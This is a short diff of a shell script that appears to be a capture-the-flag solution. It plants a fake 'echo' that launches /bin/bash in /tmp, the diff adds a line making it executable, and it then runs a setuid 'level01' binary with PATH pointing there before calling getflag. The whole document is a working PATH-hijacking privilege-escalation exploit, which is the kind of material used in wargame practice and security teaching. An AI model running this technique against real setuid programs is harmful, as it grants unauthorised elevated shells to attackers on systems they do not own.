@@ -1,4 +1,5 @@
 mkdir -p /tmp/juloo
 echo '/bin/bash' > /tmp/juloo/echo
+chmod +x /tmp/juloo/echo
 PATH="/tmp/juloo/" ./level01
 /bin/getflag
